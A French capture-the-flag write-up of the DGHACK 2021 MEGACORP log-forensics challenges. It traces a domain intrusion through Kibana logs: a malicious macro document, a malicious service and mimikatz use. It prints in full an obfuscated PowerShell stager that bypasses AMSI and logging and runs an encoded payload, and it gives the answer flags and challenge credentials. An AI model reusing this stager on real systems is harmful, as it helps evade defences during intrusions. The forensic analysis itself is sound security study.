## MEGACORP

https://www.dghack.fr/challenges/dghack/megacorp-1/
https://www.dghack.fr/challenges/dghack/megacorp-2/
https://www.dghack.fr/challenges/dghack/megacorp-3/

> L'entreprise MEGACORP, Organisme d'Importance Vitale a subi une attaque informatique.
> 
> Plusieurs agents ont déjà tenté en vain d'identifier l'intrusion (infection initiale, mouvement latéral, machines compromises), le temps nous est compté, mais fort heureusement l'entreprise nous a fourni un accès à leurs systèmes de collecte de logs basé sur Kibana (Username : dghack ; Password : dghack2021).
> 
> Nous comptons sur vous pour réussir là où les autres ont échoué au plus vite.

Challenge 1:
> Pouvez-vous retrouver le sha256 du fichier ayant initié la compromission dans le domaine ?

Challenge 2: 
> Pouvez-vous retrouver le nom du service ayant permis d'effectuer un pivot vers la machine DK2021002 ?

Challenge 3:
> Pouvez-vous retrouver le process GUID du programme ayant été utilisé pour la génération du golden ticket ?

Et nous avons un Kibana pour parcourir ces logs: http://kibana-tuazhu.inst.malicecyber.com/

Nous avons donc 3030 logs sur 50 minutes, qui semblent être issus d'un domaine où Windows règne. 
Je n'ai pas noté tous les éléments qui m'ont mené à la résolution, donc je ne vais présenter que les éléments principaux.  

À 16:05:14.993 nous avons le log du téléchargement d'un fichier docm.  Le SHA256 est le 1er flag (`DGA{3F0A801DEBE411DBCA3B572796116B56B527F85823FA84B03223CB68161D07BF}`).

```
File stream created:
RuleName: -
UtcTime: 2021-10-15 14:05:14.965
ProcessGuid: {4752ea04-8a9a-6169-8901-000000002800}
ProcessId: 3932
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\uri.cato\Downloads\cv_stagiaire.docm
CreationUtcTime: 2021-10-15 14:05:13.594
Hash: MD5=511B26079FE3F4B48242F64BD514433C,SHA256=3F0A801DEBE411DBCA3B572796116B56B527F85823FA84B03223CB68161D07BF,IMPHASH=00000000000000000000000000000000
Contents: -
```

À 16:08:27.328 l'ouverture de ce document sur DK2021001.

```
winlog.event_data.CommandLine
"C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\uri.cato\Downloads\cv_stagiaire.docm" /o ""
```

À 16:19:33.571	un service installé qui semble contenir un shellcode.  Le nom du service nous donne le second flag (`DGA{tAdOaSoAfpmBCIRD}`). 

```
Un service a été installé sur le système.

Nom du service :  tAdOaSoAfpmBCIRD
Nom du fichier de service :  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $bIb4=((''{''+''0}crip''+''t{1''+''}loc{2''+''}Logging'')-f''S'',''B'',''k'');If($PSVersionTable.PSVersion.Major -ge 3){ $on=[Collections.Generic.Dictionary[string,System.Object]]::new(); $z5W_6=((''{1}nabl{2}Scri{0}''+''{3}Blo''+''ckL''+''og''+''ging''+'''')-f''p'',''E'',''e'',''t''); $oxZlX=[Ref].Assembly.GetType(((''{1}ystem.{3}ana{2}emen''+''t.{4}uto''+''mation''+''.{''+''5''+''}t''+''i{0}s''+'''')-f''l'',''S'',''g'',''M'',''A'',''U'')); $lcna=((''{1}na{2}l{3}''+''S''+''c{''+''0}i{4}tBlockI''+''n{''+''5}ocation''+''Logg''+''ing'')-f''r'',''E'',''b'',''e'',''p'',''v''); $mdYw=$oxZlX.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); $hGip=[Ref].Assembly.GetType(((''{6}{1''+''}''+''st{''+''9''+''}m.''+''{2}an''+''a{4''+''}''+''{9''+''}m{9}nt.{8}{''+''5''+''}''+''t''+''{7''+''}m''+''ati{''+''7''+''}n.''+''{8}m''+''si{3}ti{0}''+''s'')-f''l'',''y'',''M'',''U'',''g'',''u'',''S'',''o'',''A'',''e'')); if ($hGip) { $hGip.GetField(((''am{2}''+''i''+''{3''+''}''+''{''+''1}i{0}''+''Faile{''+''4''+''}'')-f''t'',''n'',''s'',''I'',''d''),''NonPublic,Static'').SetValue($null,$true); }; If ($mdYw) { $pRt=$mdYw.GetValue($null); If($pRt[$bIb4]){ $pRt[$bIb4][$lcna]=0; $pRt[$bIb4][$z5W_6]=0; } $on.Add($lcna,0); $on.Add($z5W_6,0); $pRt[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$bIb4]=$on; } Else { [Ref].Assembly.GetType(((''S''+''y{1}tem.''+''{4}anagem''+''ent.A''+''utomatio''+''n.S''+''cri''+''{0}t{5}{3}oc''+''{2}'')-f''p'',''s'',''k'',''l'',''M'',''B'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAOyNaWECA7VWbW/aSBD+Xqn/waqQMCrB5qV{1}EqnSrU0MNIGYmHcOnRZ7sbesvcReh9Be//vNGhzSS3KXO6mWSPZlZnb''+''2mWdmdpVGrqA8Upbfwnvl+9s3yuGzcYxDRS2sppdlpZDy0nGrENeVz4o6R5{1''+''}Nk4eYRovzczONYxKJ/bzSIgIlCQmXjJJELSl/KuOA''+''xOTkevmVuEL5rhT+qLQYX2J2ENuZ2A2Ic''+''oI{2}T+5dcRdLryrOhlGhFn//vV{2}an1QXlYvbFLNE''+''LTq7RJCw4jFWLCk/SvLAwW5D1GKXujFP+EpUxjSq1yrDKMEr0gNrd6RLRMC9pAhXOV4mJ{2}KNI3knaWQvohZhaMfcRZ4XkyQplpW5ND9fLH5T54ezb9JI0JBUOpEgMd84JL6jLkkqbRx5jNyQ1QK0HBHTyF+US{2}B2x9dELUQpY2Xlv5hRe2SbI/daJfWxEkjZI{2}6VIZpPb{1}nlXsrIXq/4jJsy/{2}X49hwA5H5I8FY5a4KJ9fEZ1hwX8m+e7RBwV7V5QjPlz4peVrpwNBY83sG0MIhTUlo8gK0UvjbDqPxaa9VcFRS3/uwLLM1HnHqLo4GfQl9wl+ngTEq9zOQmWdGINHcRDqmbk1V9L{2}Rkx''+''UgGS{2}UX64GLavGwQbwmYcTHQsIsmfFE7SKk4kHXSCnzSIxc''+''CGsCXkHESz87s4+cWuxEXRICfvs5ULWwghQhufQhLXb56XIOQkWT4SQpK3YKOeqWFYdgRryygqKEHrZQKng2LB7d7aZMUBcnIje3KP0dz8O5Jo8SEacuhBYwGDgb4lLMJCRlpU09Yuwc6ufnF58FxMSMQfaApTsICKxIIBwhCRODqxk5ShW''+''H{2}E64YSQEmaxoWAz7UCIOOZIxDPvEK77kaZ4Ne+pLbHJQHv''+''kJAXcYF2VlRGMBNUj{2}LDn2v9x4Wn32/pgxOURIzTN{1}buyETIVCsJVEPY''+''CUQRILgMOKeWjghHxs7EuN+k67pjaCb9psO''+''5SM1rTa2cKvC79hd3VqC52H{1}N7hXddM7JZ1{2}ujW37qnPeR6Xzxy5owawrnoCNNG7T7VjUbgGvogG/vTYUdMO6g9CFym28225kwTnW7bY2lrb8N{1}NNoTHdXrjeu6vgb4prTqr5HXC+n2/grGUFOvr4xOYugddvHFvFmOa9ZszNpawwpWY544H6dNTd''+''POPN''+''zs7hAyuFfv7{2}bVG''+''z5ou6HR{2}Lh2ZjbW6AIhM7oYWQa/nBoxsrUR9{2}3O7GrUCX0TGZZLyaw/{1}Ix+3zLQsPX1{1}nmm+drZeIIDYzy''+''q0dlmchPA3Nq2+5ea3''+''uh45BufbQG4FkfYvwEZ36y5wQpkmu+R8b7HkxpeGxwZIGPNblErmG4sm8H+YFjjaMR6E4yuZj{1}L06pTu4HaOh+3fNQHcewbfYySu+a3plYdedwbf+hNV9powj5pTbNvBxN5Z20Tyr/bdvPSnVW37vWnhqHfm{2}EN2bLmaWfDUyPaXvr2ne/1x59u7nu7JZw71LTRO6DLfEgjUa8{1}Cmlj+kHW1rdvCmn3A0GPePN''+''S3+j{2}OAkwAz5BS8hT2+KxdajzNqdSQ1WzV8KaxBFh0Fyh/eb5gBjjrmwxWUeA9rZvOrIHDju''+''ZX8+NSsqDYOnYfPKl8/MZeAkZFmwrVyTyRVDW7+u6Dl1Dv9cbWS''+''K9/mYm3+xUMF''+''WWXWePzN40y0yDNbpSVPXXQwUPCwEV7mWwXsINzl5DPYIKuS8REj2Dc/YYu/x{2}D2w4YgegVeHqc/mmyEgCBk7IrVIQsus+7uIFxno{1}49fy5lDrAvjn/R{1}vjmv/sPsqLunlA0BP1n9eeNQrf{2}EGY0wFSDpQ{1}xnZPyeeh+KQLY/CnEUI0mF1+OQb+zoVJz14{1}2W{1}4y9+OYnn2QsAAA{0}{0}'')-f''='',''t'',''i'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
Type de service :  service en mode utilisateur
Type de démarrage du service :  Démarrage à la demande
Compte de service :  LocalSystem
```

Enfin, vers 16:29:22.501 nous avons un log de `mimikatz`, dont le GUID est notre troisième flag (`DGA{0FEEC322-9042-6169-8900-000000001D00}`).

```
Process Create:
RuleName: -
UtcTime: 2021-10-15 14:29:22.501
ProcessGuid: {0FEEC322-9042-6169-8900-000000001D00}
ProcessId: 3220
Image: C:\Users\Public\mimikatz.exe
FileVersion: 2.2.0.0
Description: mimikatz for Windows
Product: mimikatz
Company: gentilkiwi (Benjamin DELPY)
OriginalFileName: mimikatz.exe
CommandLine: .\mimikatz.exe
CurrentDirectory: C:\Users\Public\
User: NT AUTHORITY\SYSTEM
LogonGuid: {0FEEC322-8C65-6169-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 1
IntegrityLevel: System
Hashes: MD5=BB8BDB3E8C92E97E2F63626BC3B254C4,SHA256=912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9,IMPHASH=9528A0E91E28FBB88AD433FEABCA2456
ParentProcessGuid: {0FEEC322-902F-6169-8700-000000001D00}
ParentProcessId: 2980
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe
```
